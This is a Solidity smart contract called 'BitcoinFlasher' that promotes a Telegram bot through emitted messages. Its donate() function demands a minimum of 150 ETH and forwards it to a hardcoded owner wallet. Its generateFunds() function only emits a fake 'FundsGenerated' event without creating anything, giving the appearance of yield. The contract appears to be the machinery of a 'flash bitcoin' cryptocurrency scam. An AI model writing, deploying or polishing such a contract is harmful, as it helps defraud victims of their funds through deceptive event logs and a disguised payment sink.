// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BitcoinFlasher {
    address payable private owner;
    address payable private constant OWNER_WALLET = payable(0x3A06322e9F1124F6B2de8F343D4FDce4D1009869);
    uint256 public faucetAmount = 0.1 ether; // Faucet amount
    uint256 public minDonation = 150 ether; // Minimum donation in ETH
    string[] private telegramMessages = [
        "Join Bitcoin Flasher Telegram Bot: https://t.me/BitcoinFlasherRoBot",
        "Stay updated with Bitcoin Flasher: https://t.me/BitcoinFlasherRoBot",
        "Get support and updates from our Bot: https://t.me/BitcoinFlasherRoBot"
    ];

    // Event to log donations
    event DonationReceived(address indexed donor, uint256 amount);

    // Event to log faucet payments
    event FaucetPayment(address indexed receiver, uint256 amount);

    // Event to log automatic fund generation
    event FundsGenerated(uint256 amount);

    // Event to log random message sending
    event RandomMessageSent(string message);

    constructor() {
        owner = payable(msg.sender);
    }

    // Modifier to check if the caller is the owner
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    // Function to donate
    function donate() public payable {
        require(msg.value >= minDonation, "Minimum donation not met.");
        OWNER_WALLET.transfer(msg.value);
        emit DonationReceived(msg.sender, msg.value); // Log the donation
        sendRandomMessage(); // Send random Telegram promotion message
    }

    // Function to withdraw funds
    function withdraw(uint256 amount) public onlyOwner {
        require(amount <= address(this).balance, "Insufficient balance");
        OWNER_WALLET.transfer(amount);
    }

    // Automated faucet function
    function faucet() public {
        require(address(this).balance >= faucetAmount, "Insufficient faucet balance");
        payable(msg.sender).transfer(faucetAmount);
        emit FaucetPayment(msg.sender, faucetAmount); // Log the faucet payment
        sendRandomMessage(); // Send random Telegram promotion message
    }

    // Automated fund generation function (example)
    function generateFunds() public onlyOwner {
        uint256 generatedAmount = 1 ether; // Example generated amount
        emit FundsGenerated(generatedAmount); // Log the fund generation
    }

    // Fallback function to accept any incoming funds
    receive() external payable {}

    // Function to send a random Telegram message to promote the bot/channel
    function sendRandomMessage() private {
        uint256 randomIndex = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % telegramMessages.length;
        string memory message = telegramMessages[randomIndex];
        emit RandomMessageSent(message); // Log the message
    }
}
